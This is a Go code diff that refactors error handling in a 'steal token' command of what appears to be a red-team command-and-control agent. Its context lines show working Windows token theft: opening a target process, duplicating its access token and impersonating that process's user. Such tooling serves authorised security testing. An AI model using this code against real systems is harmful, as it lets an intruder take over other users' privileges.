@@ -32,19 +32,11 @@ type StealTokenParams struct {
 func (c *StealTokenCommand) Execute(task structs.Task) structs.CommandResult {
 	var params StealTokenParams
 	if err := json.Unmarshal([]byte(task.Params), &params); err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Failed to parse parameters: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Failed to parse parameters: %v", err)
 	}
 
 	if params.PID == 0 {
-		return structs.CommandResult{
-			Output:    "PID is required",
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult("PID is required")
 	}
 
 	// Get current identity before stealing
@@ -63,11 +55,7 @@ func (c *StealTokenCommand) Execute(task structs.Task) structs.CommandResult {
 		// Try with limited information access (works on more processes)
 		hProcess, err = windows.OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, false, uint32(params.PID))
 		if err != nil {
-			return structs.CommandResult{
-				Output:    fmt.Sprintf("OpenProcess failed for PID %d: %v (check permissions/SeDebugPrivilege)", params.PID, err),
-				Status:    "error",
-				Completed: true,
-			}
+			return errorf("OpenProcess failed for PID %d: %v (check permissions/SeDebugPrivilege)", params.PID, err)
 		}
 	}
 	defer windows.CloseHandle(hProcess)
@@ -83,11 +71,7 @@ func (c *StealTokenCommand) Execute(task structs.Task) structs.CommandResult {
 		// Fall back to specific rights needed for impersonation
 		err = windows.OpenProcessToken(hProcess, STEAL_TOKEN_ACCESS, &hToken)
 		if err != nil {
-			return structs.CommandResult{
-				Output:    fmt.Sprintf("OpenProcessToken failed for PID %d: %v", params.PID, err),
-				Status:    "error",
-				Completed: true,
-			}
+			return errorf("OpenProcessToken failed for PID %d: %v", params.PID, err)
 		}
 	}
 
@@ -99,11 +83,7 @@ func (c *StealTokenCommand) Execute(task structs.Task) structs.CommandResult {
 	ret, _, err := procImpersonateLoggedOnUser.Call(uintptr(hToken))
 	if ret == 0 {
 		hToken.Close()
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("ImpersonateLoggedOnUser failed: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("ImpersonateLoggedOnUser failed: %v", err)
 	}
 
 	// Duplicate the token for storage (Xenon Token.c lines 143-157)
@@ -131,11 +111,7 @@ func (c *StealTokenCommand) Execute(task structs.Task) structs.CommandResult {
 			hToken.Close()
 			// Revert since we couldn't duplicate
 			procRevertToSelf.Call()
-			return structs.CommandResult{
-				Output:    fmt.Sprintf("DuplicateTokenEx failed: %v", err),
-				Status:    "error",
-				Completed: true,
-			}
+			return errorf("DuplicateTokenEx failed: %v", err)
 		}
 	}
 
@@ -147,11 +123,7 @@ func (c *StealTokenCommand) Execute(task structs.Task) structs.CommandResult {
 	if ret == 0 {
 		windows.CloseHandle(windows.Handle(duplicatedToken))
 		procRevertToSelf.Call()
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("ImpersonateLoggedOnUser (duplicated token) failed: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("ImpersonateLoggedOnUser (duplicated token) failed: %v", err)
 	}
 
 	// Store the duplicated token in global state
@@ -165,11 +137,7 @@ func (c *StealTokenCommand) Execute(task structs.Task) structs.CommandResult {
 	// Verify impersonation
 	newIdentity, err := GetCurrentIdentity()
 	if err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Token stolen but failed to verify identity: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Token stolen but failed to verify identity: %v", err)
 	}
 
 	// Format output
@@ -184,11 +152,7 @@ func (c *StealTokenCommand) Execute(task structs.Task) structs.CommandResult {
 	}
 	output += fmt.Sprintf("New: %s", newIdentity)
 
-	return structs.CommandResult{
-		Output:    output,
-		Status:    "success",
-		Completed: true,
-	}
+	return successResult(output)
 }
 
 // ExecuteWithAgent implements the AgentCommand interface
